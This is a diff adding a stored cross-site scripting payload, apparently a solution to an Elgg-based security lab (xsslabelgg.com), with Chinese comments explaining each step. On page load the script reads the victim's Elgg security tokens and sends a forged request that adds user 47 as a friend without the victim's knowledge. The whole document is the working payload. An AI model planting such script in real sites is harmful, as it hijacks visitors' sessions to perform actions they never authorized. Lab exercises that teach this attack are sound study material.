@@ -1,0 +1,40 @@
+<!-- 嵌入js代码，在受害者不知情的情况下，添加朋友
+分析过程见analysis.txt -->
+
+<span>when you see my profile,you have been attacked by XSS. </span>
+
+<script type="text/javascript">
+window.onload = function(){
+    // 提取参数 -- 参数在后面，之后用window.onload
+    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+
+    // alert('ts='+ts);
+    // alert('token='+token);
+
+    // 构造url
+    var sendUrl = "http://www.xsslabelgg.com/action/friends/add?friend=47" + ts + token;
+
+    // 创建和发送Ajax请求
+    var Ajax = new XMLHttpRequest();
+    Ajax.open('GET',sendUrl,true);
+    // Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+
+    Ajax.send();
+
+    // 接受返回
+    // Ajax.onreadystatechange = function(){ // 状态发生变化时，函数被回调
+    //     if(Ajax.readyState == 4){ // 成功完成
+    //         // 判断响应结果
+    //         if(Ajax.status == 200){
+    //             // alert('success');
+    //             alert(Ajax.responseText);
+    //         }else{
+    //             alert('failure');
+    //         }
+    //     }
+    // }
+}
+
+
+</script>
